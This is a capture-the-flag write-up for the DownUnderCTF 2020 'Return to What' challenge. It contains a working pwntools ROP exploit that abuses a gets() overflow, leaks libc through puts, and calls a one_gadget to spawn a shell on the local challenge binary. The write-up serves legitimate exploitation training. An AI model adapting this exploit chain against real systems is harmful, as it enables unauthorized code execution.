+++
tags = ["rop","ctf","linux"]
categories = ["Capture the Flag", "Binary Exploitation"]
date = "2021-08-16"
description = "A writeup for the binary exploitation challenge 'return to what' from DownUnderCTF 2020."
featuredpath = "date"
linktitle = ""
title = "DUCTF 2020 :: Return to What"
slug = "ductf-2020-return-to-what"
type = "post"
+++

## Reverse Engineering

We'll start by running `file` to get an idea of the executable's architecture and platform. Note that it is a 64-bit linux executable.

```
$ file return-to-what 
return-to-what: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=02d43d7f8ca04895439f73b904f5204ba9984802, not stripped
```

Running pwntools' `checksec` tool reveals that the only exploit protection in place is an enabled NX bit. So while we can't execute shellcode on the stack, we'll at least be able to access any part of the executable.

```
$ checksec return-to-what                                                                                  130 ⨯
[*] './return-to-what'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Running the executable reveals that it's only functionality is to accept user input, prior to exiting. It's likely that we'll find a vulnerability of some sort here.

```
$ ./return-to-what 
Today, we'll have a lesson in returns.
Where would you like to return to?
asdf
```

Disassembly the executable shows us that it contains two important functions. The `main` function, which calls a function called `vuln`. The `vuln` function makes a `gets` call, we've found a buffer overflow.

```c
void vuln(void)
{
    char *s;
    
    puts("Where would you like to return to?");
    gets(&s);
    return;
}

undefined8 main(void)
{
    puts("Today, we\'ll have a lesson in returns.");
    vuln();
    return 0;
}
```

Since the executable doesn't leak any import information to us (such as a `libc` address), we'll have to find a way to leak something ourselves.

Looking at the imported functions, we can see an entry for `puts`. With this we should be able to do a classic `libc` leak with `puts(puts)`, more on that later.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  gets@plt
0x0000000000401050  setvbuf@plt
0x0000000000401060  _start
0x0000000000401090  _dl_relocate_static_pie
0x00000000004010a0  deregister_tm_clones
0x00000000004010d0  register_tm_clones
0x0000000000401110  __do_global_dtors_aux
0x0000000000401140  frame_dummy
0x0000000000401142  setup
0x0000000000401185  vuln
0x00000000004011ad  main
0x00000000004011d0  __libc_csu_init
0x0000000000401230  __libc_csu_fini
0x0000000000401234  _fini
```

Before going any further, let's find the offset of the `puts` function within `libc`. Below is a few GDB commands that achieves this goal.

Here's what we're doing:
 - Printing the process map to get the start address of `libc`.
 - Getting the address of `puts`.
 - Subtracting the start address of `libc` from `puts` to get the offset.

```
pwndbg> info proc map
process 1968
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
...
      0x7ffff7def000     0x7ffff7e14000    0x25000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
pwndbg> p puts
$4 = {int (const char *)} 0x7ffff7e655f0 <__GI__IO_puts>
pwndbg> p/x 0x7ffff7e655f0-0x7ffff7def000
$5 = 0x765f0
```

There are a few more things we need to find before we can write our shellcode, mainly:
 - A `pop rdi` instruction, so we can leak `libc`.
 - The 'magic' gadget, so we can get a shell.

We can use the `ropper` tool to find a `pop rdi` instruction, easily found within the executable.

```
$ ropper --file ./return-to-what --search 'pop rdi'
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./return-to-what
0x000000000040122b: pop rdi; ret;
```

Using the `one_gadget` tool, we can find a 'magic' gadget that'll immediately give us a shell, provided we meet the conditions. We just need a rop gadget that will help us set this up.

```
$ one_gadget /usr/lib/x86_64-linux-gnu/libc-2.31.so
0xcbd1a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xcbd1d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xcbd20 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

The 'magic' gadget I like the most is the first one, so let's find a gadget that'll set this up. We'll use `ropper` again.

```
$ ropper --file ./return-to-what --search 'pop r12'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r12

[INFO] File: ./return-to-what
0x0000000000401224: pop r12; pop r13; pop r14; pop r15; ret;
```


## Information Gathering

Now that we've found everything we need, we can do a little more information gathering to get the last thing we need for our exploit - the offset of the return address from our input buffer.

Here's a quick script that'll attach the process to GDB before sending a large cyclic pattern of bytes to it, allowing us to find the offset of the return address.

```py
#!/usr/bin/env python3

from pwn import *

r = process('./return-to-what')
gdb.attach(r)

r.clean()
r.writeline(cyclic(100, n=8))

r.interactive()
```

After continuing in GDB and letting the program crash, we can see what was stored in the return address.

```
 ► 0x4011ac <vuln+39>    ret    <0x6161616161616168>
```

Using pwntools' `cyclic_find` function, we can use the value we found above to calculate the offset of the return address from our input buffer.

```py
In [2]: cyclic_find(0x6161616161616168, n=8)
Out[2]: 56
```


## Exploit Development

Now that we have everything we need, we can begin to write our exploit. There's quite a few things that we need to achieve, here's a list:
 - Overwrite the return address to get control of process execution.
 - Use `puts` to print the value of `puts` stored in the global offset table (a `libc` address).
 - Capture the leaked `libc` address, and subtract the offset of the `puts` address to get the start address of `libc`.
 - Use the leaked `libc` address to redirect process execution to our 'magic' gadget to get a shell. 

Keep in mind that we need to setup carefully for the 'magic' gadget, as it'll only execute under specific circumstances.

```py
#!/usr/bin/env python3

from pwn import *

context.clear(arch='amd64')


pad = b'A' * 56


'''
0x000000000040122b: pop rdi; ret;
'''
pop_rdi = 0x040122b

'''
0x0000000000401224: pop r12; pop r13; pop r14; pop r15; ret;
'''
setup = 0x0401224


r = process('./return-to-what')


elf = ELF('./return-to-what')
rop = ROP(elf)

# pop rdi; ret
rop.raw(pop_rdi)
rop.raw(elf.got['puts']) # pop rdi

# puts
rop.raw(elf.plt['puts']) # puts(puts)

# main
rop.raw(elf.sym['main'])

r.clean()
r.writeline(pad + rop.chain())

leak = r.readline()[:-1]
leak = unpack(leak, len(leak) * 8)
libc = leak - 0x765f0

magic = libc + 0xcbd1a


rop = ROP(elf)

# setup 
rop.raw(setup)
rop.raw(0) # pop r12
rop.raw(0) # pop r13
rop.raw(0) # pop r14
rop.raw(0) # pop r15

# magic gadget
rop.raw(magic)

r.writeline(pad + rop.chain())


r.clean()
r.interactive()
```

And finally, here's our exploit in action. It gives us an interactive shell that we can use to read the flag.

```
$ ./exploit.py
[+] Starting local process './return-to-what': pid 2145
[*] './return-to-what'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './return-to-what'
[*] Switching to interactive mode
$ cat flag.txt
DUCTF{ret_pUts_ret_main_ret_where???}
$ 
[*] Stopped process './return-to-what' (pid 2145)
```

